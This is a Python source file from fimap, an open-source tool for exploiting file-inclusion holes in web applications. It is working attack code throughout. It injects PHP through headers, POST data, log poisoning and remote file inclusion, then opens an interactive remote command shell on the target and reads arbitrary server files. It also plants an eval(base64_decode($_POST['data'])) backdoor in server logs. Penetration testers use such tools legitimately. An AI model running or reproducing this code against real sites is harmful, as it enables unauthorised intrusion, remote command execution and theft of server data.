#
# This file is part of fimap.
#
# Copyright(c) 2009-2010 Iman Karim(ikarim2s@smail.inf.fh-brs.de).
# http://fimap.googlecode.com
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
#
import base64
import shutil
import os
import sys
from baseClass import baseClass
from config import settings
import urllib2

__author__="Iman Karim(ikarim2s@smail.inf.fh-brs.de)"
__date__ ="$03.09.2009 03:40:49$"

shell_banner =  "-------------------------------------------\n" + \
                "Welcome to fimap shell!\n" + \
                "Better don't start interactive commands! ;)\n" +\
                "Also remember that this is not a persistent shell.\n" +\
                "Every command opens a new shell and quits it after that!\n" +\
                "Enter 'q' to exit the shell.\n"+\
                "-------------------------------------------"


class codeinjector(baseClass):
    def _load(self):
        self.report = None
        self.isLogKickstarterPresent = False

    def setReport(self, report):
        self.report = report

    def testExecutionMethods(self):
        info_payload = self.settings["php_info"][0]
        info_pattern = self.settings["php_info"][1]
        
        #for k,v in self.settings["php_exec"]

    def start(self):
        domain = self.chooseDomains()
        vuln   = self.chooseVuln(domain.getAttribute("hostname"))

        hostname = domain.getAttribute("hostname")
        mode = vuln.getAttribute("mode")
        fpath = vuln.getAttribute("path")
        param = vuln.getAttribute("param")
        prefix = vuln.getAttribute("prefix")
        suffix = vuln.getAttribute("suffix")
        appendix = vuln.getAttribute("appendix")
        shcode = vuln.getAttribute("file")
        paramvalue = vuln.getAttribute("paramvalue")
        kernel = domain.getAttribute("kernel")
        postdata = vuln.getAttribute("postdata")
        ispost = vuln.getAttribute("ispost") == "1"
        language = vuln.getAttribute("language")
        print vuln.getAttribute("language")
        
        xml2config = self.config["XML2CONFIG"]
        langClass = xml2config.getAllLangSets()[language]
        
        if (kernel == ""): kernel = None
        payload = "%s%s%s" %(prefix, shcode, suffix)
        if (not ispost):
            path = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
        else:
            postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
        php_inject_works = False
        sys_inject_works = False
        working_shell    = None

        url  = "http://%s%s" %(hostname, path)

        code = None

        if (mode.find("A") != -1 and mode.find("x") != -1):
            self._log("Testing %s-code injection thru User-Agent..."%(language), self.LOG_INFO)

        elif (mode.find("P") != -1 and mode.find("x") != -1):
            self._log("Testing %s-code injection thru POST..."%(language), self.LOG_INFO)

        elif (mode.find("L") != -1):
            if (mode.find("H") != -1):
                self._log("Testing %s-code injection thru Logfile HTTP-UA-Injection..."%(language), self.LOG_INFO)
            elif (mode.find("F") != -1):
                self._log("Testing %s-code injection thru Logfile FTP-Username-Injection..."%(language), self.LOG_INFO)

        elif (mode.find("R") != -1):
            if settings["dynamic_rfi"]["mode"] == "ftp":
                self._log("Testing code thru FTP->RFI...", self.LOG_INFO)
                if (not ispost):
                    url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
                else:
                    postdata = postdata.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
            elif settings["dynamic_rfi"]["mode"] == "local":
                self._log("Testing code thru LocalHTTP->RFI...", self.LOG_INFO)
                if (not ispost):
                    url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
                else:
                    postdata = postdata.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
            else:
                print "fimap is currently not configured to exploit RFI vulnerabilitys."
                sys.exit(1)


        quiz, answer = langClass.generateQuiz()
        php_test_code = quiz
        php_test_result = answer

        code = self.__doHaxRequest(url, postdata, mode, php_test_code, suffix)
        if code == None:
            self._log("%s-code testing failed! code=None"%(language), self.LOG_ERROR)
            sys.exit(1)


        if (code.find(php_test_result) != -1):
            self._log("%s Injection works! Testing if execution works..."%(language), self.LOG_ALWAYS)
            php_inject_works = True
            shellquiz, shellanswer = xml2config.generateShellQuiz()
            shell_test_code = shellquiz
            shell_test_result = shellanswer
            for item in langClass.getExecMethods():
                try:
                    name = item.getName()
                    payload = None
                    self._log("Testing execution thru '%s'..."%(name), self.LOG_INFO)
                    testload = item.generatePayload(shell_test_code, True)
                    if (mode.find("A") != -1):
                        self.setUserAgent(testload)
                        code = self.doPostRequest(url, postdata)
                    elif (mode.find("P") != -1):
                        if (postdata != ""):
                            testload = "%s&%s" %(postdata, testload)
                        code = self.doPostRequest(url, testload)
                    elif (mode.find("R") != -1):
                        code = self.executeRFI(url, postdata, suffix, testload)
                    elif (mode.find("L") != -1):
                        testload = self.convertUserloadToLogInjection(testload)
                        if (postdata != ""):
                            testload = "%s&%s" %(postdata, testload)
                        code = self.doPostRequest(url, testload)
                    if code != None and code.find(shell_test_result) != -1:
                        sys_inject_works = True
                        working_shell = item
                        self._log("Execution thru '%s' works!"%(name), self.LOG_INFO)
                        if (kernel == None):
                            self._log("Requesting kernel version...", self.LOG_DEBUG)
                            uname_cmd = item.generatePayload(xml2config.getKernelCode(), True)
                            kernel = self.__doHaxRequest(url, postdata, mode, uname_cmd, suffix).strip()
                            self._log("Kernel received: %s" %(kernel), self.LOG_DEBUG)
                            domain.setAttribute("kernel", kernel)
                            self.saveXML()

                        break
                except KeyboardInterrupt:
                    self._log("Aborted by user.", self.LOG_WARN)
                    
            attack = None
            while (attack != "q"):
                attack = self.chooseAttackMode(language, php=php_inject_works, syst=sys_inject_works)
                

                if (type(attack) == str):
                    if (attack == "fimap_shell"):
                        cmd = ""
                        print "Please wait - Setting up shell (one request)..."
                        pwd_cmd = item.generatePayload("pwd", True)
                        curdir = self.__doHaxRequest(url, postdata, mode, pwd_cmd, suffix).strip()
                        print shell_banner

                        while 1==1:
                            cmd = raw_input("fimap_shell:%s$> " %curdir)
                            if cmd == "q" or cmd == "quit": break
                            
                            if (cmd.strip() != ""):
                                userload = item.generatePayload("cd '%s'; %s"%(curdir, cmd), True)
                                code = self.__doHaxRequest(url, postdata, mode, userload, suffix)
                                if (cmd.startswith("cd ")):
                                    cmd = "cd '%s'; %s; pwd"%(curdir, cmd)
                                    cmd = item.generatePayload(cmd, True)
                                    curdir = self.__doHaxRequest(url, postdata, cmd , suffix).strip()
                                print code.strip()
                        print "See ya dude!"
                        print "Do not forget to close this security hole."
                        sys.exit(0)
                    else:
                        print "Strange stuff..."
                else:
                    cpayload = attack.generatePayload()

                    shellcode = None

                    if (not attack.doInShell()):
                        shellcode = cpayload
                    else:
                        shellcode = item.generatePayload(cpayload, True)


                    code = self.__doHaxRequest(url, postdata, mode, shellcode, appendix)
                    if (code == None):
                        print "Exploiting Failed!"
                        sys.exit(1)
                    print code.strip()
        elif (code.find(php_test_code) != -1):
            
            try:
                self._log("Injection not possible! It looks like a file disclosure bug.", self.LOG_WARN)
                self._log("fimap can currently not readout files comfortably.", self.LOG_WARN)
                go = raw_input("Do you still want to readout files (even without filtering them)? [Y/n] ")
                if (go == "Y" or go == "y" or go == ""):
                    while 1==1:
                        inp = raw_input("Absolute filepath you want to read out: ")
                        if (inp == "q"):
                            print "Fix this hole! Bye."
                            sys.exit(0)
                        payload = "%s%s%s" %(prefix, inp, suffix)
                        if (not ispost):
                            path = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
                        else:
                            postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
                        url = "http://%s%s" %(hostname, path)
                        code = self.__doHaxRequest(url, postdata, mode, "", appendix, False)
                        print "--- Unfiltered output starts here ---"
                        print code
                        print "--- EOF ---"
                else:
                    print "Cancelled. If you want to read out files by hand use this URL:"
                    
                    if (not ispost):
                        path = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, "ABSOLUTE_FILE_GOES_HERE"))
                        url = "http://%s%s" %(hostname, path)
                        print "URL: " + url
                    else:
                        postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, "ABSOLUTE_FILE_GOES_HERE"))
                        url = "http://%s%s" %(hostname, path)
                        print "URL          : " + url
                        print "With Postdata: " + postdata
            except KeyboardInterrupt:
                raise

        else:
            print "Failed to test injection. :("


    def __doHaxRequest(self, url, postdata, m, payload, appendix=None, doFilter=True):
        code = None
        rndStart = self.getRandomStr()
        rndEnd = self.getRandomStr()
        
        userload = None
        if doFilter:
            userload = "<? echo \"%s\"; ?> %s <? echo \"%s\"; ?>" %(rndStart, payload, rndEnd) #TODO: Make language independet.
        else:
            pass #userload = "%s%s%s" %(rndStart, payload, rndEnd)
            
        if (m.find("A") != -1):
            self.setUserAgent(userload)
            code = self.doPostRequest(url, postdata)
        elif (m.find("P") != -1):
            if (postdata != ""): userload = "%s&%s" %(postdata, userload)
            code = self.doPostRequest(url, userload)
        elif (m.find("R") != -1):
            code = self.executeRFI(url, postdata, appendix, userload)
        elif (m.find("L") != -1):
            if (not self.isLogKickstarterPresent):
                self._log("Testing if log kickstarter is present...", self.LOG_INFO)
                testcode = self.getPHPQuiz()
                p = "data=" + base64.b64encode(testcode[0])
                if (postdata != ""):
                    p = "%s&%s" %(postdata, p)
                code = self.doPostRequest(url, p)
                if (code.find(testcode[1]) == -1):
                    self._log("Kickstarter is not present. Injecting kickstarter...", self.LOG_INFO)
                    kickstarter = "<? eval(base64_decode($_POST['data'])); ?>"
                    ua = self.getUserAgent()
                    self.setUserAgent(kickstarter)
                    tmpurl = None
                    if (url.find("?") != -1):
                        tmpurl = url[:url.find("?")]
                    else:
                        tmpurl = url
                    self.doGetRequest(tmpurl)
                    self.setUserAgent(ua)
                    
                    self._log("Testing once again if kickstarter is present...", self.LOG_INFO)
                    testcode = self.getPHPQuiz()
                    p = "data=" + base64.b64encode(testcode[0])
                    if (postdata != ""):
                        p = "%s&%s" %(postdata, p)
                    code = self.doPostRequest(url, p)

                    if (code.find(testcode[1]) == -1):
                        self._log("Failed to inject kickstarter!", self.LOG_ERROR)
                        sys.exit(1)
                    else:
                        self._log("Kickstarter successfully injected!", self.LOG_INFO)
                        self.isLogKickstarterPresent = True
                else:
                    self._log("Kickstarter found!", self.LOG_INFO)
                    self.isLogKickstarterPresent = True

            if (self.isLogKickstarterPresent):
                # Remove all <? and ?> tags.
                userload = self.convertUserloadToLogInjection(userload)
                if (postdata != ""):
                    userload = "%s&%s" %(postdata, userload)
                code = self.doPostRequest(url, userload)
        if (code != None): 
            if doFilter:
                code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
                
        return(code)

    def testRFI(self):
        c, r = self.getPHPQuiz()
        if (settings["dynamic_rfi"]["mode"] == "local"):
            print "Testing Local->RFI configuration..."
            code = self.executeRFI(settings["dynamic_rfi"]["local"]["http_map"], "", c)
            if (code == c):
                print "Dynamic RFI works!"
                print "Testing if you have disabled .php interpreter..."
                settings["dynamic_rfi"]["ftp"]["ftp_path"] = settings["dynamic_rfi"]["local"]["local_path"] + ".php"
                code = self.executeRFI(settings["dynamic_rfi"]["local"]["http_map"] + ".php", "", "<? %s ?>"%c)
                if (code == c):
                    print "ALL OK! You are ready to go!"
                elif (code == r):
                    print "WARNING! FILES WHICH ENDS WITH .php WILL BE EXECUTED ON YOUR SERVER! FIX THAT!"
            else:
                print "Failed! Something went wrong..."


        elif (settings["dynamic_rfi"]["mode"] == "ftp"):
            print "Testing FTP->RFI configuration..."
            code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"], "", c)
            if (code != None):
                code = code.strip()
                if (code == c):
                    print "Dynamic RFI works!"
                    print "Testing if you have disabled .php interpreter..."
                    settings["dynamic_rfi"]["ftp"]["ftp_path"] = settings["dynamic_rfi"]["ftp"]["ftp_path"] + ".php"
                    code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"] + ".php", "", "<? %s ?>"%c)
                    if (code == c):
                        print "ALL OK! You are ready to go!"
                    elif (code == r):
                        print "WARNING! FILES WHICH ENDS WITH .php WILL BE EXECUTED ON YOUR SERVER! FIX THAT!"

                else:
                    print "Failed! Something went wrong..."
            else:
                print "Code == None. That's not good! Failed!"
        else:
            print "You haven't enabled and\\or configurated fimap RFI mode."
            print "Fix that in config.py"
            

    def convertUserloadToLogInjection(self, userload):
        userload = userload.replace("<?php", "").replace("?>", "")
        userload = userload.replace("<?", "")
        userload = "data=" + base64.b64encode(userload).replace("+", "%2B").replace("=", "%3D")
        return(userload)


    def chooseAttackMode(self, language, php=True, syst=True):
        header = ""
        choose = {}
        textarr = []
        idx = 1
        
        xml2config = self.config["XML2CONFIG"]
        langClass = xml2config.getAllLangSets()[language]
        
        if (syst):
            header = ":: Available Attacks - %s and SHELL access ::" %(language)
            textarr.append("[1] Spawn fimap shell")
            choose[1] = "fimap_shell"
            idx = 2
            for payloadobj in langClass.getPayloads():
                k = payloadobj.getName()
                v = payloadobj
                textarr.append("[%d] %s"%(idx,k))
                choose[idx] = v
                idx = idx +1
            
            #TODO: SYSTEM COMMANDS FROM GENERIC.XML
            #for k,v in settings["payloads"]["sys"].items():
            #    textarr.append("[%d] %s"%(idx,k))
            #    choose[idx] = ("sys",v)
            #    idx = idx +1

        else:
            header = ":: Available Attacks - %s Only ::" %(language)
            for payloadobj in langClass.getPayloads():
                k = payloadobj.getName()
                v = payloadobj
                textarr.append("[%d] %s"%(idx,k))
                choose[idx] = v
                idx = idx +1

        textarr.append("[q] Quit")
        self.drawBox(header, textarr)
        while (1==1):
            tech = raw_input("Choose Attack: ")
            try:
                if (tech.strip() == "q"):
                    sys.exit(0)
                tech = choose[int(tech)]
                return(tech)

            except Exception, err:
                print "Invalid attack. Press 'q' to break."
        
        
    def executeRFI(self, URL, postdata, appendix, content):
        if (appendix == "%00"): appendix = ""
        if settings["dynamic_rfi"]["mode"]=="ftp":
            up = self.FTPuploadFile(content, appendix)
            code = self.doPostRequest(URL, postdata)
            if up["dirstruct"]:
                self.FTPdeleteDirectory(up["ftp"])
            else:
                self.FTPdeleteFile(up["ftp"])
            return(code)
        elif settings["dynamic_rfi"]["mode"]=="local":
            up = self.putLocalPayload(content, appendix)
            code = self.doPostRequest(URL, postdata)
            self.deleteLocalPayload(up["local"])
            return(code)
            

    
    def chooseDomains(self, OnlyExploitable=True):
        choose = {}
        nodes = self.getDomainNodes()
        idx = 1
        header = ":: List of Domains ::"
        textarr = []
        doRemoteWarn = False
        
        for n in nodes:
            host = n.getAttribute("hostname")
            kernel = n.getAttribute("kernel")
            if (kernel == ""): kernel = None
            showit = False
            for child in self.getNodesOfDomain(host):
                mode = child.getAttribute("mode")
                if ("x" in mode):
                    showit = True
                elif (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] not in ("ftp", "local")):
                    doRemoteWarn = True
                elif (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] in ("ftp", "local")):
                    showit = True

            if (showit or not OnlyExploitable):
                choose[idx] = n
                if (kernel != None):
                    textarr.append("[%d] %s (%s)" %(idx, host, kernel))
                else:
                    textarr.append("[%d] %s" %(idx, host))
                idx = idx +1

        textarr.append("[q] Quit")
        self.drawBox(header, textarr)
        if (doRemoteWarn):
            print "WARNING: Some domains may be not listed here because dynamic_rfi is not configured! "

        while(1==1):
            c = raw_input("Choose Domain: ")
            if (c == "q"):
                sys.exit(0)
            try:
                c = int(c)
                ret = choose[c]
                return(ret)
            except:
                print "Invalid Domain ID."


    def chooseVuln(self, hostname):
        choose = {}
        nodes = self.getNodesOfDomain(hostname)
        doRemoteWarn = False

        idx = 1
        header = ":: FI Bugs on '" + hostname + "' ::"
        textarr = []
        for n in nodes:
            path = n.getAttribute("path")
            file = n.getAttribute("file")
            param = n.getAttribute("param")
            mode = n.getAttribute("mode")
            ispost = n.getAttribute("ispost")=="1"
            
            if (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] not in ("ftp", "local")):
                doRemoteWarn = True

            if (mode.find("x") != -1 or (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] in ("ftp", "local"))):
                choose[idx] = n
                if (ispost==1):
                    textarr.append("[%d] URL: '%s' injecting file: '%s' using POST-param: '%s'" %(idx, path, file, param))
                else:
                    textarr.append("[%d] URL: '%s' injecting file: '%s' using GET-param: '%s'" %(idx, path, file, param))
                idx = idx +1

        if (idx == 1):
            if (doRemoteWarn):
                print "WARNING: Some bugs can not be used because dynamic_rfi is not configured!"
            print "This domain has no usable bugs."
            sys.exit(1)

        
        textarr.append("[q] Quit")
        self.drawBox(header, textarr)

        if (doRemoteWarn):
            print "WARNING: Some bugs are suppressed because dynamic_rfi is not configured!"

        while (1==1):
            c = raw_input("Choose vulnerable script: ")
            if (c == "q"):
                sys.exit(0)
            try:
                c = int(c)
                ret = choose[c]
                return(ret)
            except:
                print "Invalid script ID."